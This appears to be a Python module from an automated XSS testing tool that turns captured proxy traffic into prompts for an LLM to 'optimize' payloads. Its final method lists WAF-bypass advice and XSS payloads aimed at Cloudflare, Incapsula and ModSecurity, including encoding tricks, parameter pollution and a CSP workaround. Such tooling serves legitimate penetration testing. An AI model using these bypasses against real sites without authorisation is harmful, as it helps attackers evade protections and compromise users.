"""
Proxy Traffic Analyzer for LLM-based payload optimization
"""
import json
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

from ..models.verification import ProxyCaptureEntry


class ProxyTrafficAnalyzer:
    """Analyzes proxy traffic data and formats it for LLM analysis"""

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)

    def format_for_llm(self, proxy_captures: List[ProxyCaptureEntry], target_url: str, payload: str) -> str:
        """
        Format proxy traffic data for LLM analysis

        Args:
            proxy_captures: List of captured HTTP requests/responses
            target_url: The target URL being tested
            payload: The XSS payload that was attempted

        Returns:
            Formatted string suitable for LLM prompt
        """
        if not proxy_captures:
            return "No proxy traffic captured - unable to analyze network-level patterns."

        analysis = []
        analysis.append("NETWORK TRAFFIC ANALYSIS:")
        analysis.append(f"Total HTTP requests captured: {len(proxy_captures)}")
        analysis.append("")

        # Group requests by type and analyze patterns
        payload_requests = []
        other_requests = []

        for capture in proxy_captures:
            if self._contains_payload(capture, payload, target_url):
                payload_requests.append(capture)
            else:
                other_requests.append(capture)

        # Analyze payload-related requests
        if payload_requests:
            analysis.append("PAYLOAD DELIVERY ANALYSIS:")
            for i, capture in enumerate(payload_requests, 1):
                analysis.append(f"  Request {i}:")
                analysis.append(f"    Method: {capture.request.get('method', 'GET')}")
                analysis.append(f"    URL: {capture.request.get('url', 'unknown')}")
                analysis.append(f"    Status: {capture.response.get('status', 'unknown')}")

                # Analyze request transformation
                transformation = self._analyze_payload_transformation(capture, payload)
                if transformation:
                    analysis.append(f"    Payload Transformation: {transformation}")

                # Analyze response patterns
                response_analysis = self._analyze_response_patterns(capture)
                if response_analysis:
                    analysis.append(f"    Response Analysis: {response_analysis}")

                # Check for filtering/blocking indicators
                filtering = self._detect_filtering_mechanisms(capture)
                if filtering:
                    analysis.append(f"    Filtering Detected: {filtering}")

                analysis.append("")

        # Analyze supporting requests (JS, CSS, images)
        if other_requests:
            analysis.append("SUPPORTING REQUESTS ANALYSIS:")
            js_requests = [r for r in other_requests if self._is_js_request(r)]
            css_requests = [r for r in other_requests if self._is_css_request(r)]

            if js_requests:
                analysis.append(f"  JavaScript requests: {len(js_requests)}")
                for js_req in js_requests[:3]:  # Limit to first 3
                    url = js_req.request.get('url', '')
                    status = js_req.response.get('status', 'unknown')
                    analysis.append(f"    - {url} (Status: {status})")

            if css_requests:
                analysis.append(f"  CSS requests: {len(css_requests)}")

        # Analyze security headers across all requests
        security_analysis = self._analyze_security_headers(proxy_captures)
        if security_analysis:
            analysis.append("")
            analysis.append("SECURITY HEADERS ANALYSIS:")
            analysis.append(security_analysis)

        # Analyze timing patterns
        timing_analysis = self._analyze_timing_patterns(proxy_captures)
        if timing_analysis:
            analysis.append("")
            analysis.append("TIMING ANALYSIS:")
            analysis.append(timing_analysis)

        return "\n".join(analysis)

    def _contains_payload(self, capture: ProxyCaptureEntry, payload: str, target_url: str) -> bool:
        """Check if this request contains the payload or targets the main URL"""
        request = capture.request
        url = request.get('url', '')
        body = request.get('body', '')

        # Check if URL matches target
        target_host = urlparse(target_url).netloc
        request_host = urlparse(url).netloc

        if target_host == request_host:
            # Check if payload is in URL or body
            return payload in url or payload in body

        return False

    def _analyze_payload_transformation(self, capture: ProxyCaptureEntry, payload: str) -> Optional[str]:
        """Analyze how the payload was transformed in transit"""
        request = capture.request
        url = request.get('url', '')
        body = request.get('body', '')

        transformations = []

        # Check for URL encoding
        import urllib.parse
        if urllib.parse.quote(payload) in url or urllib.parse.quote(payload) in body:
            transformations.append("URL-encoded")

        # Check for HTML entity encoding
        import html
        if html.escape(payload) in body:
            transformations.append("HTML-entity-encoded")

        # Check for base64 encoding
        import base64
        try:
            encoded = base64.b64encode(payload.encode()).decode()
            if encoded in url or encoded in body:
                transformations.append("Base64-encoded")
        except:
            pass

        # Check for case modifications
        if payload.lower() in url.lower() or payload.lower() in body.lower():
            if payload not in url and payload not in body:
                transformations.append("case-modified")

        return ", ".join(transformations) if transformations else None

    def _analyze_response_patterns(self, capture: ProxyCaptureEntry) -> Optional[str]:
        """Analyze response patterns for insights"""
        response = capture.response
        status = response.get('status', 0)
        body = response.get('body', '')
        headers = response.get('headers', {})

        patterns = []

        # Check for redirect patterns
        if 300 <= status < 400:
            location = headers.get('Location') or headers.get('location')
            if location:
                patterns.append(f"Redirects to: {location}")

        # Check for error patterns
        if status >= 400:
            patterns.append(f"HTTP {status} error")
            if 'error' in body.lower() or 'blocked' in body.lower():
                patterns.append("Contains error/blocked keywords")

        # Check response size
        if len(body) < 100:
            patterns.append("Very small response (possible filtering)")
        elif len(body) > 50000:
            patterns.append("Large response (full page loaded)")

        # Check content type
        content_type = headers.get('Content-Type') or headers.get('content-type', '')
        if 'text/html' in content_type:
            patterns.append("HTML response")
        elif 'application/json' in content_type:
            patterns.append("JSON response")

        return ", ".join(patterns) if patterns else None

    def _detect_filtering_mechanisms(self, capture: ProxyCaptureEntry) -> Optional[str]:
        """Detect filtering/protection mechanisms from request/response"""
        response = capture.response
        headers = response.get('headers', {})
        body = response.get('body', '')

        filters = []

        # WAF signatures in headers
        waf_headers = ['cf-ray', 'x-sucuri-id', 'x-mod-security', 'x-akamai']
        for header_name, header_value in headers.items():
            if any(waf in header_name.lower() for waf in waf_headers):
                filters.append(f"WAF header: {header_name}")

        # Server signatures
        server = headers.get('Server') or headers.get('server', '')
        if any(waf in server.lower() for waf in ['cloudflare', 'sucuri', 'incapsula']):
            filters.append(f"WAF server: {server}")

        # Security headers
        security_headers = ['x-xss-protection', 'content-security-policy', 'x-frame-options']
        for sec_header in security_headers:
            if any(sec_header in h.lower() for h in headers.keys()):
                value = next((v for k, v in headers.items() if sec_header in k.lower()), '')
                filters.append(f"{sec_header}: {value[:50]}")

        # Body-based filtering
        if body:
            filter_keywords = ['blocked', 'filtered', 'security violation', 'mod_security']
            for keyword in filter_keywords:
                if keyword in body.lower():
                    filters.append(f"Body contains: {keyword}")
                    break

        return ", ".join(filters) if filters else None

    def _is_js_request(self, capture: ProxyCaptureEntry) -> bool:
        """Check if request is for JavaScript"""
        url = capture.request.get('url', '')
        content_type = capture.response.get('headers', {}).get('Content-Type', '')
        return url.endswith('.js') or 'javascript' in content_type

    def _is_css_request(self, capture: ProxyCaptureEntry) -> bool:
        """Check if request is for CSS"""
        url = capture.request.get('url', '')
        content_type = capture.response.get('headers', {}).get('Content-Type', '')
        return url.endswith('.css') or 'text/css' in content_type

    def _analyze_security_headers(self, captures: List[ProxyCaptureEntry]) -> Optional[str]:
        """Analyze security headers across all requests"""
        all_headers = {}
        for capture in captures:
            headers = capture.response.get('headers', {})
            for name, value in headers.items():
                name_lower = name.lower()
                if any(sec in name_lower for sec in ['security', 'xss', 'csrf', 'cors', 'content-security']):
                    if name_lower not in all_headers:
                        all_headers[name_lower] = value

        if all_headers:
            analysis = []
            for header, value in all_headers.items():
                analysis.append(f"  {header}: {value[:100]}{'...' if len(value) > 100 else ''}")
            return "\n".join(analysis)

        return "No security headers detected"

    def _analyze_timing_patterns(self, captures: List[ProxyCaptureEntry]) -> Optional[str]:
        """Analyze timing patterns that might indicate rate limiting or processing delays"""
        if len(captures) < 2:
            return None

        # Calculate response times (if available in HAR data)
        # This is a simplified version - full HAR parsing would give actual timing
        patterns = []

        # Check for consistent delays
        statuses = [c.response.get('status', 200) for c in captures]
        if any(s >= 400 for s in statuses):
            error_count = sum(1 for s in statuses if s >= 400)
            patterns.append(f"{error_count}/{len(captures)} requests resulted in errors")

        # Check for rate limiting indicators
        rate_limit_headers = ['x-ratelimit', 'retry-after', 'x-rate-limit']
        for capture in captures:
            headers = capture.response.get('headers', {})
            for header_name in headers:
                if any(rl in header_name.lower() for rl in rate_limit_headers):
                    patterns.append(f"Rate limiting detected: {header_name}")
                    break

        return ", ".join(patterns) if patterns else None

    def get_bypass_suggestions(self, proxy_captures: List[ProxyCaptureEntry], failure_reason: str) -> List[str]:
        """Generate specific bypass suggestions based on proxy traffic analysis"""
        suggestions = []

        if not proxy_captures:
            return ["No proxy data available for analysis"]

        # Analyze all captures for patterns
        for capture in proxy_captures:
            headers = capture.response.get('headers', {})
            status = capture.response.get('status', 200)
            body = capture.response.get('body', '')

            # WAF-specific bypasses
            server = headers.get('Server', '').lower()
            if 'cloudflare' in server:
                suggestions.extend([
                    "Try Cloudflare-specific bypasses: <svg/onload=alert(1)>",
                    "Use double encoding: %253Cscript%253E",
                    "Try mixed case: <ScRiPt>alert(1)</ScRiPt>"
                ])
            elif 'incapsula' in server:
                suggestions.extend([
                    "Try Incapsula bypass: <iframe src=javascript:alert(1)>",
                    "Use HTML5 vectors: <details open ontoggle=alert(1)>"
                ])

            # Status code specific bypasses
            if status == 403:
                suggestions.extend([
                    "403 Forbidden - Try parameter pollution: ?param=safe&param=<script>alert(1)</script>",
                    "Try different HTTP methods: POST instead of GET",
                    "Use alternative injection points: headers, cookies"
                ])
            elif status == 406:
                suggestions.extend([
                    "406 Not Acceptable - Try different Content-Type headers",
                    "Use different encoding: charset=UTF-7"
                ])

            # Content-based bypasses
            if 'mod_security' in body.lower():
                suggestions.extend([
                    "ModSecurity detected - Try: <img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                    "Use whitespace variations: <script\x09>alert(1)</script>"
                ])

            # Security header bypasses
            csp = headers.get('Content-Security-Policy', '')
            if csp:
                if 'unsafe-inline' not in csp:
                    suggestions.append("CSP blocks inline scripts - try JSONP or DOM-based vectors")
                if "'self'" in csp:
                    suggestions.append("CSP allows 'self' - try uploading malicious JS file")

        # Remove duplicates and return
        return list(set(suggestions))